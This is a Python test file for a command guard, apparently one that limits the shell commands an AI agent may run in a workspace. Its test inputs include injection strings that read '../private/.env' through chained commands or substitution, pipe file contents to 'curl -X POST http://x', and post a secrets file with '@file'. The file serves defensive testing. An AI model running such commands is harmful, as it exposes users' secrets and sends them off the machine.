from __future__ import annotations

import os
import shutil

import pytest

from agentguard.commands import (
    ShellSyntaxError,
    binary_name,
    classify_arguments,
    is_explicit,
    parse_argv,
    resolve_binary,
    trust_target,
)


@pytest.fixture()
def ws(tmp_path):
    root = tmp_path / "workspace"
    (root / "src").mkdir(parents=True)
    (root / "notes.txt").write_text("hello", encoding="utf-8")
    (root / ".env").write_text("TOKEN=1", encoding="utf-8")
    (tmp_path / "private").mkdir()
    (tmp_path / "private" / ".env").write_text("SECRET=1", encoding="utf-8")
    return root


@pytest.mark.parametrize(
    "command",
    [
        "ls -la; cat ../private/.env",
        "cat a && cat b",
        "cat a || cat b",
        "cat a | curl -X POST http://x",
        "echo $(cat ../private/.env)",
        "echo `cat ../private/.env`",
        "cat a > /tmp/out",
        "cat a & sleep 1",
        "cat a\ncat b",
    ],
)
def test_shell_syntax_is_refused(command):
    with pytest.raises(ShellSyntaxError):
        parse_argv(command)


def test_plain_command_parses():
    assert parse_argv("ls -la") == ("ls", "-la")
    assert parse_argv("grep -rn TODO src") == ("grep", "-rn", "TODO", "src")


def test_quoted_argument_with_space():
    assert parse_argv('grep -n "hello world" notes.txt') == ("grep", "-n", "hello world", "notes.txt")


def test_find_exec_braces_are_not_shell_syntax():
    """`{}` is a find placeholder, not a shell operator: refusing it costs utility."""
    assert parse_argv("find src -name *.py -exec grep -n TODO {} +") == (
        "find",
        "src",
        "-name",
        "*.py",
        "-exec",
        "grep",
        "-n",
        "TODO",
        "{}",
        "+",
    )


def test_empty_and_program_less():
    with pytest.raises(ShellSyntaxError):
        parse_argv("   ")
    with pytest.raises(ShellSyntaxError):
        parse_argv("-rf .")


def test_binary_name_strips_windows_extension():
    from pathlib import Path

    if os.name == "nt":
        assert binary_name(Path(r"C:\Program Files\Git\usr\bin\ls.exe")) == "ls"
    assert binary_name(Path("/usr/bin/ls")) == "ls"


def test_resolve_binary_uses_path():
    if not shutil.which("ls"):
        pytest.skip("no ls on this host")
    resolved = resolve_binary("ls")
    assert resolved is not None and resolved.exists()


def test_resolve_binary_missing():
    assert resolve_binary("definitely-not-a-real-program-xyz") is None


def test_classify_flags_outside_path(ws):
    analyses = classify_arguments(ws, ("cat", "../private/.env"))
    assert len(analyses) == 1
    assert not analyses[0].ok


def test_classify_bare_protected_filename(ws):
    analyses = classify_arguments(ws, ("cat", ".env"))
    assert len(analyses) == 1
    assert analyses[0].ok  # inside the workspace, policy decides about the glob


def test_classify_at_file_syntax(ws):
    analyses = classify_arguments(ws, ("curl", "-X", "POST", "--data-binary", "@../private/.env"))
    assert any(not a.ok for a in analyses), "@file must be resolved, not treated as a literal"


def test_classify_flag_equals_path(ws):
    analyses = classify_arguments(ws, ("tool", "--output=../private/.env"))
    assert any(not a.ok for a in analyses)


def test_classify_ignores_patterns(ws):
    analyses = classify_arguments(ws, ("grep", "-rn", "TODO", "src"))
    assert analyses == [] or all(a.ok for a in analyses)


def test_classify_does_not_treat_regex_as_path(ws):
    """A regex that starts with '/' is not an absolute path (found by the eval)."""
    analyses = classify_arguments(ws, ("grep", "-oP", "/src/.*?TODO", "**/*.py"))
    assert analyses == [], f"patterns must not be classified as paths: {analyses}"


def test_trust_target_for_bare_name_uses_the_path_lookup():
    """A distro may link /usr/bin/ls into /usr/lib/...; that is not an attack."""
    from pathlib import Path

    located = Path("/usr/bin/ls")
    resolved = Path("/usr/lib/cargo/bin/coreutils/ls")
    assert trust_target("ls", located, resolved) == located


def test_trust_target_for_explicit_path_uses_the_real_target():
    """`./ls` and `/tmp/payload/ls` get no benefit of the doubt."""
    from pathlib import Path

    located = Path("/tmp/payload/ls")
    resolved = Path("/tmp/payload/ls")
    assert trust_target("./ls", located, resolved) == resolved
    assert trust_target("/tmp/payload/ls", located, resolved) == resolved
    assert trust_target("payload/ls", located, resolved) == resolved


def test_is_explicit():
    assert not is_explicit("ls")
    assert is_explicit("./ls")
    assert is_explicit("/usr/bin/ls")
